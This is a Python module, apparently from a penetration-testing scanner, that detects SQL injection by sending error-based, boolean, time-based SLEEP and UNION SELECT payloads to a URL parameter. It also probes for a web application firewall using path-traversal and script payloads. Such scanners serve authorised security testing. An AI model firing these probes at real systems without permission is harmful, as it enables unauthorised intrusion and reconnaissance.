"""
SQL Injection Detection Module
"""

import time
import requests
from urllib.parse import quote
from colorama import Fore

from .utils import Color

class SQLDetector:
    """SQL Injection detection engine"""
    
    def __init__(self, session, timeout=10, verbose=False, techniques=None):
        self.session = session
        self.timeout = timeout
        self.verbose = verbose
        self.techniques = techniques or ['B', 'E', 'U', 'T']
        
        # State
        self.baseline = None
        self.baseline_length = 0
        self.baseline_content = ""
        self.waf_detected = None
        
        # Payloads
        self.error_payloads = [
            "'", '"', "\\", "'--", '"--', "' OR '1'='1", "' OR 1=1--"
        ]
        
        self.boolean_true = [
            "1' AND '1'='1",
            "1' AND 1=1--",
            "1' AND TRUE--"
        ]
        
        self.boolean_false = [
            "1' AND '1'='2",
            "1' AND 1=2--",
            "1' AND FALSE--"
        ]
        
        self.time_payloads = [
            ("1' AND SLEEP(3)--", 3),
            ("1' AND IF(1=1, SLEEP(3), 0)--", 3)
        ]
        
        self.waf_signatures = [
            'cloudflare', 'mod_security', 'sucuri', 'barracuda',
            'fortinet', 'imperva', 'aws_waf', 'akamai'
        ]
    
    def _get_baseline(self, url, param):
        """Get baseline response"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            self.baseline = response
            self.baseline_length = len(response.text)
            self.baseline_content = response.text
            if self.verbose:
                print(f"{Color.CYAN}[*] Baseline length: {self.baseline_length}{Color.RESET}")
            return True
        except Exception as e:
            if self.verbose:
                print(f"{Color.RED}[-] Baseline failed: {e}{Color.RESET}")
            return False
    
    def _is_different(self, response):
        """Check if response differs from baseline"""
        if not response:
            return True
        
        length_diff = abs(len(response.text) - self.baseline_length)
        if length_diff > (self.baseline_length * 0.1):
            return True
        
        return False
    
    def _test_payload(self, url, param, payload):
        """Test a single payload"""
        try:
            if '=' in url:
                test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
            else:
                test_url = f"{url}?{param}={quote(payload)}"
            
            return self.session.get(test_url, timeout=self.timeout)
        except:
            return None
    
    def detect_waf(self, url, param):
        """Detect WAF/IPS"""
        if self.waf_detected is not None:
            return self.waf_detected
        
        print(f"{Color.YELLOW}[*] Checking for WAF...{Color.RESET}")
        
        test_payloads = ["' OR 1=1--", "<script>", "../../../etc/passwd"]
        
        for payload in test_payloads:
            try:
                test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check response
                response_text = response.text.lower()
                headers = str(response.headers).lower()
                
                for waf in self.waf_signatures:
                    if waf in response_text or waf in headers:
                        self.waf_detected = waf.upper()
                        print(f"{Color.RED}[!] WAF Detected: {self.waf_detected}{Color.RESET}")
                        return True
                
                if response.status_code in [403, 406, 501]:
                    print(f"{Color.YELLOW}[!] Possible WAF (status {response.status_code}){Color.RESET}")
                    self.waf_detected = "UNKNOWN"
                    return True
                    
            except:
                continue
        
        print(f"{Color.GREEN}[+] No WAF detected{Color.RESET}")
        self.waf_detected = False
        return False
    
    def check_error_based(self, url, param):
        """Check error-based SQL injection"""
        if 'E' not in self.techniques:
            return False
        
        print(f"{Color.YELLOW}[*] Testing Error-based...{Color.RESET}")
        
        error_keywords = ['sql', 'mysql', 'syntax', 'unclosed', 'quotes', 'warning', 'error']
        
        for payload in self.error_payloads:
            response = self._test_payload(url, param, payload)
            if response:
                for keyword in error_keywords:
                    if keyword in response.text.lower():
                        print(f"{Color.GREEN}[+] Error-based SQL injection detected!{Color.RESET}")
                        return True
        return False
    
    def check_boolean_blind(self, url, param):
        """Check boolean-based blind SQL injection"""
        if 'B' not in self.techniques:
            return False
        
        print(f"{Color.YELLOW}[*] Testing Boolean-based Blind...{Color.RESET}")
        
        if not self._get_baseline(url, param):
            return False
        
        for true_payload, false_payload in zip(self.boolean_true, self.boolean_false):
            true_resp = self._test_payload(url, param, true_payload)
            false_resp = self._test_payload(url, param, false_payload)
            
            if true_resp and false_resp:
                true_diff = self._is_different(true_resp)
                false_diff = self._is_different(false_resp)
                
                if self.verbose:
                    print(f"{Color.CYAN}[*] TRUE: {true_payload} -> {true_diff}{Color.RESET}")
                    print(f"{Color.CYAN}[*] FALSE: {false_payload} -> {false_diff}{Color.RESET}")
                
                if not true_diff and false_diff:
                    print(f"{Color.GREEN}[+] Boolean-based Blind detected!{Color.RESET}")
                    return True
        
        return False
    
    def check_time_blind(self, url, param):
        """Check time-based blind SQL injection"""
        if 'T' not in self.techniques:
            return False
        
        print(f"{Color.YELLOW}[*] Testing Time-based Blind...{Color.RESET}")
        
        for payload, expected_delay in self.time_payloads:
            try:
                test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
                start = time.time()
                self.session.get(test_url, timeout=self.timeout+expected_delay+2)
                elapsed = time.time() - start
                
                if self.verbose:
                    print(f"{Color.CYAN}[*] Payload: {payload} -> Delay: {elapsed:.2f}s{Color.RESET}")
                
                if elapsed >= expected_delay - 1:
                    print(f"{Color.GREEN}[+] Time-based Blind detected! (Delay: {elapsed:.2f}s){Color.RESET}")
                    return True
            except:
                continue
        
        return False
    
    def check_union_based(self, url, param):
        """Check union-based SQL injection"""
        if 'U' not in self.techniques:
            return False
        
        print(f"{Color.YELLOW}[*] Testing Union-based...{Color.RESET}")
        
        # Find number of columns
        for i in range(1, 15):
            payload = f"' ORDER BY {i}--"
            response = self._test_payload(url, param, payload)
            
            if response and ('unknown column' in response.text.lower() or 'error' in response.text.lower()):
                columns = i - 1
                if columns > 0:
                    print(f"{Color.GREEN}[+] Found {columns} columns{Color.RESET}")
                    
                    # Test UNION
                    columns_str = ','.join(['database()'] + ['NULL']*(columns-1))
                    union_payload = f"' UNION SELECT {columns_str}--"
                    response = self._test_payload(url, param, union_payload)
                    
                    if response and 'database' in response.text.lower():
                        print(f"{Color.GREEN}[+] Union-based SQL injection detected!{Color.RESET}")
                        return True
                break
        
        return False
    
    def check_vulnerability(self, url, param):
        """Check all SQL injection techniques"""
        
        # Order of checks
        checks = [
            ('Error-based', self.check_error_based),
            ('Union-based', self.check_union_based),
            ('Boolean-based Blind', self.check_boolean_blind),
            ('Time-based Blind', self.check_time_blind)
        ]
        
        for name, check_func in checks:
            if check_func(url, param):
                return True, name
        
        return False, None